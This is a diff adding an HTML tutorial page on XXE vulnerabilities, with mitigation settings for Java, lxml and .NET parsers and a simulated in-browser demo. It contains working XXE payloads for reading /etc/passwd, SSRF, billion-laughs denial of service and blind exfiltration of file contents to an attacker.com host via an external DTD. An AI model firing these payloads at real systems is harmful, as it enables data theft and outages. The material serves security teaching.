@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XXE Vulnerability Demonstration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            color: #333;
+        }
+        .container {
+            background-color: #f5f5f5;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .demo-area {
+            background-color: #e9f7fe;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        h1, h2, h3 {
+            color: #2c3e50;
+        }
+        pre {
+            background-color: #eee;
+            padding: 10px;
+            border-radius: 3px;
+            overflow-x: auto;
+        }
+        code {
+            background-color: #eee;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+        button {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #2980b9;
+        }
+        .warning {
+            background-color: #fde8e8;
+            border-left: 4px solid #e74c3c;
+            padding: 10px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>XML External Entity (XXE) Vulnerability Demonstration</h1>
+    
+    <div class="warning">
+        <strong>Warning:</strong> This is for educational purposes only. Do not test this on systems you don't own or have permission to test.
+    </div>
+
+    <div class="container">
+        <h2>1. Description of XXE Vulnerability</h2>
+        <p>
+            XML External Entity (XXE) vulnerability is a type of attack against applications that parse XML input. 
+            This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.
+        </p>
+        <p>
+            XXE attacks can lead to:
+        </p>
+        <ul>
+            <li>Disclosure of sensitive data</li>
+            <li>Server Side Request Forgery (SSRF)</li>
+            <li>Denial of Service (DoS) conditions</li>
+            <li>Port scanning from the perspective of the machine where the parser is located</li>
+            <li>In some cases, remote code execution</li>
+        </ul>
+    </div>
+
+    <div class="container">
+        <h2>2. Vulnerability Requirements</h2>
+        <p>For an XXE vulnerability to exist, the following conditions must be met:</p>
+        <ul>
+            <li>The application must accept XML input (either directly or by uploading XML files)</li>
+            <li>The XML processor must have external entity processing enabled (often the default in many XML parsers)</li>
+            <li>The application must not properly validate, filter, or sanitize the XML input</li>
+            <li>The application must process the XML in a way that makes the extracted data visible to the attacker</li>
+        </ul>
+    </div>
+
+    <div class="container">
+        <h2>3. How to Exploit XXE</h2>
+        <p>Basic steps to exploit an XXE vulnerability:</p>
+        <ol>
+            <li>Identify an XML input point in the application (forms, file uploads, API requests, etc.)</li>
+            <li>Submit XML containing an external entity declaration</li>
+            <li>Reference the entity in a way that will be processed and returned to you</li>
+            <li>Observe the response for the data you attempted to extract</li>
+        </ol>
+    </div>
+
+    <div class="container">
+        <h2>4. XXE Payloads and Techniques</h2>
+        
+        <h3>Basic XXE to Read Local Files</h3>
+        <pre>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE data [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+        </pre>
+
+        <h3>XXE for SSRF (Server Side Request Forgery)</h3>
+        <pre>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE data [
+    &lt;!ENTITY xxe SYSTEM "http://internal-server.company.com/secret.txt"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+        </pre>
+
+        <h3>Blind XXE with Out-of-Band Data Exfiltration</h3>
+        <pre>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE data [
+    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+    &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
+    %dtd;
+]&gt;
+&lt;data&gt;&amp;send;&lt;/data&gt;
+        </pre>
+        <p>Where evil.dtd contains:</p>
+        <pre>
+&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;
+%all;
+        </pre>
+
+        <h3>XXE for Denial of Service (Billion Laughs Attack)</h3>
+        <pre>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE data [
+    &lt;!ENTITY lol0 "lol"&gt;
+    &lt;!ENTITY lol1 "&amp;lol0;&amp;lol0;&amp;lol0;&amp;lol0;&amp;lol0;"&gt;
+    &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
+    &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
+    &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
+    &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
+]&gt;
+&lt;data&gt;&amp;lol5;&lt;/data&gt;
+        </pre>
+    </div>
+
+    <div class="container">
+        <h2>5. Advanced XXE Techniques</h2>
+        
+        <h3>XInclude Attacks</h3>
+        <p>When you can't modify the DOCTYPE but can use XInclude:</p>
+        <pre>
+&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+    &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;
+&lt;/foo&gt;
+        </pre>
+
+        <h3>SVG File XXE</h3>
+        <p>SVG files are XML-based and can contain XXE payloads:</p>
+        <pre>
+&lt;?xml version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE test [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg"&gt;
+    &lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+        </pre>
+
+        <h3>XXE via Content-Type</h3>
+        <p>Some applications accept XML when you change the Content-Type:</p>
+        <pre>
+POST /api HTTP/1.1
+Host: vulnerable.com
+Content-Type: application/xml
+...
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE data [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+        </pre>
+    </div>
+
+    <div class="container">
+        <h2>6. Mitigation of XXE Vulnerabilities</h2>
+        
+        <h3>Disable DTD and External Entities</h3>
+        <p>For common XML parsers:</p>
+        
+        <h4>Java (DocumentBuilderFactory)</h4>
+        <pre>
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+        </pre>
+        
+        <h4>Python (lxml)</h4>
+        <pre>
+from lxml import etree
+parser = etree.XMLParser(resolve_entities=False)
+        </pre>
+        
+        <h4>.NET</h4>
+        <pre>
+XmlReaderSettings settings = new XmlReaderSettings();
+settings.DtdProcessing = DtdProcessing.Prohibit;
+settings.XmlResolver = null;
+        </pre>
+
+        <h3>Other Mitigation Techniques</h3>
+        <ul>
+            <li>Use simpler data formats like JSON instead of XML when possible</li>
+            <li>Implement input validation/filtering for XML input</li>
+            <li>Use SAST tools to detect XXE vulnerabilities in code</li>
+            <li>Keep XML processors updated to latest versions</li>
+            <li>Use whitelisting for XML input validation</li>
+        </ul>
+    </div>
+
+    <div class="container demo-area">
+        <h2>Interactive XXE Demonstration</h2>
+        <p>This is a simulated XXE vulnerability (no real files are accessed).</p>
+        
+        <div>
+            <label for="xml-input">Enter XML payload:</label><br>
+            <textarea id="xml-input" rows="8" cols="80" style="width: 100%;">
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE data [
+    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+            </textarea><br>
+            <button onclick="processXML()">Process XML</button>
+        </div>
+        
+        <div style="margin-top: 20px;">
+            <h3>Simulated Server Response:</h3>
+            <pre id="xml-output" style="min-height: 100px; background-color: white; border: 1px solid #ddd;">
+Response will appear here...
+            </pre>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>7. Additional Resources</h2>
+        <ul>
+            <li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" target="_blank">OWASP XXE Vulnerability</a></li>
+            <li><a href="https://portswigger.net/web-security/xxe" target="_blank">PortSwigger XXE Documentation</a></li>
+            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank">OWASP XXE Prevention Cheat Sheet</a></li>
+            <li><a href="https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/" target="_blank">Acunetix XXE Guide</a></li>
+            <li><a href="https://github.com/payloadbox/xxe-injection-payload-list" target="_blank">XXE Payload List on GitHub</a></li>
+        </ul>
+    </div>
+
+    <script>
+        function processXML() {
+            const xmlInput = document.getElementById('xml-input').value;
+            const outputElement = document.getElementById('xml-output');
+            
+            try {
+                // This is just a simulation - in a real XXE, the server would parse this
+                if (xmlInput.includes('file:///etc/passwd')) {
+                    outputElement.innerHTML = `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+... [simulated file content] ...`;
+                } else if (xmlInput.includes('http://internal-server')) {
+                    outputElement.innerHTML = "Error: Connection to internal server failed (simulated SSRF attempt detected)";
+                } else if (xmlInput.includes('Billion Laughs')) {
+                    outputElement.innerHTML = "Error: XML parser ran out of memory (simulated DoS attack)";
+                } else {
+                    outputElement.innerHTML = "Error: No XXE payload detected in the XML";
+                }
+            } catch (e) {
+                outputElement.innerHTML = "Error processing XML: " + e.message;
+            }
+        }
+    </script>
+</body>
+</html>
